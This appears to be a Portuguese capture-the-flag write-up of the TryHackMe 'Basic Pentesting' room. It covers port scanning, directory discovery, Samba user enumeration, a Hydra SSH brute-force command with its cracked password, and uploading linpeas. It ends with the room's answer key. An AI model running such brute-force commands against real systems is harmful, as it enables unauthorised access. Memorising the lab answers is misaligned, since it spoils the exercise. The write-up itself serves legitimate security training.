# Relatório da sala [Basic Pentesting](https://tryhackme.com/r/room/basicpentestingjt)

## IP alvo: 10.10.58.148

## Informações Importantes:
Versão do Apache da WEB: Apache/2.4.18 (Ubuntu) Server at 10.10.58.148 Port 80

Utilizando nmap, descobrimos essas portas abertas:
```
Portas abertas:
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?
8080/tcp open  http-proxy
```
## Ferramentas Utilizadas 
Usando a ferramenta **Dirb** no IP do alvo, descobrimos um diretório http://10.10.58.148/development/ no qual tem informações importantes.

No diretório tem um arquivo dev.txt com o seguinte texto:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J

Outro arquivo J.txt foi encontrado:

For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
Neste .txt, descobrimos que um serviço SMB foi configurado, com isso, utilizando a ferramenta **enum4linux**, foi feita a enumeração de informações de sistema Windows e Samba, após finalizar, essas informações foram coletadas:
```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```
Descobrimos dois usuários: **Kay** e **Jan**

Utilizando **Hydra**, realizamos um ataque de bruteforce para o password de Jan para acessar via SSH o serviço
Wordlist utilizada: **rockyou.txt**
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.58.148
[22][ssh] host: 10.10.58.148   login: jan   password: armando
```

Com este user e senha, podemos acessar via SSH a máquina. ssh jan@10.10.58.148

Utilizando a ferramenta **lianPEAS**, podemos escalar previlégios no sistema.
foi passado o lianpeas via scp ```{scp /home/kali/hacking_tools/linpeas.sh jan@.10.10.58.148}```
<details>
<summary>Respostas do Desafio</summary>

1. **development**
2. **jan**
3. **armando**
4. **SSH**
5. **kay**
6. **heresareallystrongpasswordthatfollowsthepasswordpolicy**

</details>
